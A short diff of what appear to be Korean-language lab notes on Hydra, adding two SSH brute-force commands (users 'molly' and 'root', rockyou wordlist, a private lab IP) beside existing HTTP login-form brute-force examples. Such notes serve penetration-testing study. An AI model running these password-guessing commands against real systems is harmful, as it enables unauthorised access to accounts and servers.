@@ -55,6 +55,9 @@ hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form \
 "/login.php:user=^USER^&pass=^PASS^:F=로그인실패문구"
 
 hydra -l molly -P rockyou.txt <MACHINE_IP> http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
+
+hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
 ```
 
 - 로그인 실패시 출력되는 문구(F=)를 정확히 지정해야 함
